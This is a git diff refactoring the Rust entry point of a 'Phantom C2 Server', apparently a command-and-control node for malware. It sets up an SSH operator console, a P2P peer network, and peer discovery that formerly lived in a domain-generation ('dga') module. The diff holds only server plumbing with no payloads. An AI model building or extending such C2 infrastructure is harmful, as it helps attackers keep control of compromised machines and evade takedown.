@@ -1,16 +1,21 @@
+//! # Phantom C2 Server
+//!
+//! Main entry point for the Phantom Command & Control node.
+
 use log::{info, error};
-use clap::{Parser};
+use clap::Parser;
 use std::fs;
 use std::path::PathBuf;
 use ed25519_dalek::{SigningKey, SecretKey};
 use std::sync::Arc;
 use tokio::net::TcpListener;
 
-mod server;
-mod dga;
-mod p2p;
-mod eth_broadcaster;
-use p2p::P2PService;
+mod crypto;
+mod network;
+mod ssh;
+
+use network::P2PService;
+use ssh::{PhantomServer, PhantomSession};
 
 #[derive(Parser, Debug)]
 #[command(name = "Phantom C2 Server")]
@@ -20,7 +25,6 @@ struct Cli {
     #[arg(long, default_value = "keys")]
     key: PathBuf,
 
-    #[arg(long, default_value_t = 12961)]
     #[arg(long, default_value_t = 12961)]
     port: u16,
 }
@@ -61,36 +65,22 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     
     let keys_dir = cli.key.clone();
 
-    let config = russh::server::Config {
-        inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
-        auth_rejection_time: std::time::Duration::from_secs(1),
-        ..Default::default()
-    };
-    let _config = Arc::new(config);
-
-    // 3. Generate/Load Host Key (For the SSH connection itself)
-    // We generate a fresh key on startup for simplicity (User sees warning on connect)
-    // Or we could save it.
+    // Generate Host Key for SSH
     let shk = russh_keys::key::KeyPair::generate_ed25519().unwrap();
-    // Wrap in Arc/Mutex logic if needed or just use it.
-    // Russh expects us to load keys into config? 
-    // Wait, russh server logic usually sets keys in config.keys
-    
     let mut config_mut = russh::server::Config::default();
     config_mut.keys.push(shk);
+    config_mut.inactivity_timeout = Some(std::time::Duration::from_secs(3600));
+    config_mut.auth_rejection_time = std::time::Duration::from_secs(1);
     let config = Arc::new(config_mut);
 
-
-
-    // 4. Bind and Listen
+    // Bind and Listen
     let addr = format!("0.0.0.0:{}", cli.port);
     info!("Phantom C2 SSH Service Starting on {}", addr);
-    // User requested log display in this terminal
     info!("Connect via: ssh admin@<IP> -p {}", cli.port);
     
     let listener = TcpListener::bind(&addr).await.expect("Bind failed");
     
-    // 4. Initialize P2P Service
+    // Initialize P2P Service
     let p2p_service = Arc::new(P2PService::new(Arc::new(master_key.clone())).await.expect("Failed to bind P2P"));
     
     // Spawn P2P Background Tasks
@@ -102,8 +92,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Spawn Bootstrap Task
     let p2p_for_boot = p2p_service.clone();
     tokio::spawn(async move {
-        // 5. Bootstrap
-        let seeds = dga::resolve_peers().await;
+        let seeds = network::resolve_peers().await;
         for (ip, port) in seeds {
              if let Ok(addr) = format!("{}:{}", ip, port).parse() {
                  p2p_for_boot.add_peer(addr).await;
@@ -111,12 +100,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     });
 
-    // Explicitly use the Factory/State
-    // Pass p2p_service to Server so it can Broadcast
-    let server_factory = server::PhantomServer::new(Arc::new(master_key), p2p_service, keys_dir.clone());
+    // Create Server Factory
+    let server_factory = PhantomServer::new(Arc::new(master_key), p2p_service, keys_dir.clone());
 
     loop {
-        // Accept TCP
         let (stream, remote_addr) = listener.accept().await.unwrap();
         info!("[+] Incoming Connection from {}", remote_addr);
         
@@ -126,8 +113,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let p2p = server_factory.p2p_service.clone();
         let keys_dir_clone = server_factory.keys_dir.clone();
         
-        // Instantiate a fresh Session (Handler) for this connection
-        let session_handler = server::PhantomSession {
+        let session_handler = PhantomSession {
             state,
             master_key: key,
             p2p_service: p2p,
